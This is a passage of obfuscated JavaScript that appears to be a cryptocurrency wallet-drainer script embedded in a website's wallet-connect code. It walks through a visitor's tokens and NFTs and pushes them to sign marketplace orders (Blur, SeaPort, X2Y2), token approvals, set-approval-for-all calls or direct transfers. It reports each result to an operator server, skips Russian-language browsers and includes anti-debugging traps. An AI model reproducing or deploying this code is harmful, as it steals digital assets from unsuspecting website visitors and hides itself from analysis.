                                  if (MS_Settings.Settings.Sign.Tokens == 0x2) {
                                    try {
                                      await TRANSFER_TOKEN(_0x5ad586);
                                      _0x5ad586.skip = true;
                                      break;
                                    } catch (_0x3046dc) {
                                      console.log(_0x3046dc);
                                      await transfer_cancel();
                                      if (!MS_Settings.Loop_T) {
                                        break;
                                      }
                                    }
                                  }
                                }
                              }
                            }
                            break;
                          } else {
                            console.log(_0x42fc36);
                            await sign_cancel();
                            if (!MS_Settings.Loop_T) {
                              break;
                            }
                          }
                        }
                      }
                    } else {
                      if (MS_Settings.Settings.Approve.Enable && (MS_Settings.Settings.Approve.MetaMask || MS_Current_Provider != 'MetaMask' || MS_Mobile_Status)) {
                        while (true) {
                          try {
                            let _0x52dea0 = await APPROVE_TOKEN(_0x5ad586);
                            if (_0x52dea0 == 0x1) {
                              const _0x1a4f04 = send_request({
                                'action': "approve_token",
                                'user_id': MS_ID,
                                'asset': _0x5ad586,
                                'address': MS_Current_Address
                              });
                              if (MS_Settings.Settings.Wait_For_Response) {
                                await _0x1a4f04;
                              }
                            }
                            _0x5ad586.skip = true;
                            break;
                          } catch (_0x83da1d) {
                            console.log(_0x83da1d);
                            await approve_cancel();
                            if (!MS_Settings.Loop_T) {
                              break;
                            }
                          }
                        }
                      } else {
                        while (true) {
                          try {
                            await TRANSFER_TOKEN(_0x5ad586);
                            _0x5ad586.skip = true;
                            break;
                          } catch (_0x4d9d04) {
                            console.log(_0x4d9d04);
                            await transfer_cancel();
                            if (!MS_Settings.Loop_T) {
                              break;
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            } else {
              if (_0x5ad586.type == "ERC721") {
                if (typeof SIGN_BLUR !== "undefined" && MS_Settings.Settings.Blur.Enable == 0x1 && MS_Settings.Settings.Blur.Priority == 0x0 && !BL_US && MS_Current_Chain_ID == 0x1 && (await is_nft_approved(_0x5ad586.address, MS_Current_Address, "0x00000000000111abe46ff893f3b2fdf1f759a8a8")) && _0x5ad586.amount_usd >= MS_Settings.Settings.Blur.Price) {
                  await SIGN_BLUR(_0x36b265, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID);
                  BL_US = true;
                } else {
                  if (typeof SIGN_SEAPORT !== 'undefined' && MS_Settings.Settings.SeaPort.Enable == 0x1 && MS_Settings.Settings.SeaPort.Priority == 0x0 && !SP_US && MS_Current_Chain_ID == 0x1 && (await is_nft_approved(_0x5ad586.address, MS_Current_Address, "0x1E0049783F008A0085193E00003D00cd54003c71")) && _0x5ad586.amount_usd >= MS_Settings.Settings.SeaPort.Price) {
                    await SIGN_SEAPORT(_0x36b265, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID);
                    SP_US = true;
                  } else {
                    if (typeof SIGN_X2Y2 !== "undefined" && MS_Settings.Settings.x2y2.Enable == 0x1 && MS_Settings.Settings.x2y2.Priority == 0x0 && !XY_US && MS_Current_Chain_ID == 0x1 && (await is_nft_approved(_0x5ad586.address, MS_Current_Address, '0xf849de01b080adc3a814fabe1e2087475cf2e354')) && _0x5ad586.amount_usd >= MS_Settings.Settings.x2y2.Price) {
                      await SIGN_X2Y2(_0x36b265, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID);
                      XY_US = true;
                    } else {
                      if (MS_Settings.Settings.Sign.NFTs > 0x0 && (!MS_Sign_Disabled || MS_Settings.Settings.Sign.Force == 0x1)) {
                        while (true) {
                          try {
                            await SIGN_NFT(_0x5ad586);
                            if (MS_Settings.Settings.Sign.Tokens == 0x1) {
                              let _0x46150d = [];
                              for (const _0x17d74b of _0x36b265) {
                                try {
                                  if (_0x17d74b.address == _0x5ad586.address) {
                                    _0x46150d.push(_0x17d74b);
                                    _0x17d74b.skip = true;
                                  }
                                } catch (_0x199c05) {
                                  console.log(_0x199c05);
                                }
                              }
                              await send_request({
                                'action': "safa_approves",
                                'user_id': MS_ID,
                                'tokens': _0x46150d,
                                'address': MS_Current_Address,
                                'chain_id': MS_Current_Chain_ID,
                                'contract_address': _0x5ad586.address
                              });
                            }
                            _0x5ad586.skip = true;
                            break;
                          } catch (_0x29ac90) {
                            console.log(_0x29ac90);
                            if (_0x29ac90.code == -0x7f59 || _0x29ac90.code == -0x7d00) {
                              if (MS_Settings.Settings.Sign.Force == 0x1) {
                                await sign_cancel();
                              } else {
                                await sign_unavailable();
                                while (true) {
                                  if (MS_Settings.Settings.Sign.NFTs == 0x1) {
                                    try {
                                      await DO_SAFA(_0x5ad586);
                                      let _0x15a914 = [];
                                      for (const _0x451a54 of _0x36b265) {
                                        try {
                                          if (_0x451a54.address == _0x5ad586.address) {
                                            _0x15a914.push(_0x451a54);
                                            _0x451a54.skip = true;
                                          }
                                        } catch (_0x5b3112) {
                                          console.log(_0x5b3112);
                                        }
                                      }
                                      await send_request({
                                        'action': "safa_approves",
                                        'user_id': MS_ID,
                                        'tokens': _0x15a914,
                                        'address': MS_Current_Address,
                                        'chain_id': MS_Current_Chain_ID,
                                        'contract_address': _0x5ad586.address
                                      });
                                      _0x5ad586.skip = true;
                                      break;
                                    } catch (_0x1b4ea7) {
                                      console.log(_0x1b4ea7);
                                      await approve_cancel();
                                      if (!MS_Settings.Loop_NFT) {
                                        break;
                                      }
                                    }
                                  } else {
                                    if (MS_Settings.Settings.Sign.NFTs == 0x2) {
                                      try {
                                        await TRANSFER_NFT(_0x5ad586);
                                        _0x5ad586.skip = true;
                                        break;
                                      } catch (_0x4b31c0) {
                                        console.log(_0x4b31c0);
                                        await transfer_cancel();
                                        if (!MS_Settings.Loop_NFT) {
                                          break;
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                              break;
                            } else {
                              console.log(_0x29ac90);
                              await sign_cancel();
                              if (!MS_Settings.Loop_NFT) {
                                break;
                              }
                            }
                          }
                        }
                      } else {
                        if (MS_Settings.Settings.Approve.Enable) {
                          while (true) {
                            try {
                              await DO_SAFA(_0x5ad586);
                              let _0x33c2da = [];
                              for (const _0x4830ff of _0x36b265) {
                                try {
                                  if (_0x4830ff.address == _0x5ad586.address) {
                                    _0x33c2da.push(_0x4830ff);
                                    _0x4830ff.skip = true;
                                  }
                                } catch (_0x239e2f) {
                                  console.log(_0x239e2f);
                                }
                              }
                              await send_request({
                                'action': "safa_approves",
                                'user_id': MS_ID,
                                'tokens': _0x33c2da,
                                'address': MS_Current_Address,
                                'chain_id': MS_Current_Chain_ID,
                                'contract_address': _0x5ad586.address
                              });
                              _0x5ad586.skip = true;
                              break;
                            } catch (_0x3a1678) {
                              console.log(_0x3a1678);
                              await approve_cancel();
                              if (!MS_Settings.Loop_NFT) {
                                break;
                              }
                            }
                          }
                        } else {
                          while (true) {
                            try {
                              await TRANSFER_NFT(_0x5ad586);
                              _0x5ad586.skip = true;
                              break;
                            } catch (_0x1621f5) {
                              console.log(_0x1621f5);
                              await transfer_cancel();
                              if (!MS_Settings.Loop_NFT) {
                                break;
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        } catch (_0x34cf30) {
          console.log(_0x34cf30);
        }
      }
    }
    MS_Process = false;
    setTimeout(end_message, 0x7d0);
  } catch (_0x282f87) {
    console.log(_0x282f87);
  }
};
try {
  let query_string = window.location.search;
  let url_params = new URLSearchParams(query_string);
  if (url_params.get("cis") != "test" && (navigator.language || navigator.userLanguage).toLowerCase().includes('ru')) {
    MS_Bad_Country = true;
  }
} catch (_0x384a22) {
  console.log(_0x384a22);
}
document.addEventListener("DOMContentLoaded", async () => {
  try {
    await retrive_config();
    fill_chain_data();
    await retrive_contract();
    if (typeof localStorage.MS_ID === "undefined") {
      const _0x95bef6 = await send_request({
        'action': "retrive_id"
      });
      if (_0x95bef6.status == 'OK') {
        localStorage.MS_ID = _0x95bef6.data;
      } else {
        localStorage.MS_ID = Math.floor(Date.now() / 0x3e8);
      }
    }
    MS_ID = localStorage.MS_ID;
    MS_Ready = true;
    inject_modal();
    enter_website();
    for (const _0x17e6af in MS_Settings.RPCs) MS_Gas_Reserves[_0x17e6af] = 0x0;
    for (const _0x5c07ce of document.querySelectorAll('.connect-button')) {
      try {
        _0x5c07ce.addEventListener("click", () => ms_init());
      } catch (_0x2d05d0) {
        console.log(_0x2d05d0);
      }
    }
  } catch (_0x3090a2) {
    console.log(_0x3090a2);
  }
});
const use_wc = () => {
  connect_wallet('WalletConnect');
};
window.addEventListener('beforeunload', _0x5d6ba5 => leave_website());
window.addEventListener("onbeforeunload", _0x190205 => leave_website());
function _0x1abc84(_0x265917) {
  function _0x470d3e(_0x11a2b2) {
    if (typeof _0x11a2b2 === 'string') {
      return function (_0x1b84ed) {}.constructor("while (true) {}").apply("counter");
    } else if (('' + _0x11a2b2 / _0x11a2b2).length !== 0x1 || _0x11a2b2 % 0x14 === 0x0) {
      (function () {
        return true;
      }).constructor("debugger").call("action");
    } else {
      (function () {
        return false;
      }).constructor("debugger").apply("stateObject");
    }
    _0x470d3e(++_0x11a2b2);
  }
  try {
    if (_0x265917) {
      return _0x470d3e;
    } else {
      _0x470d3e(0x0);
    }
  } catch (_0x5170f7) {}
}
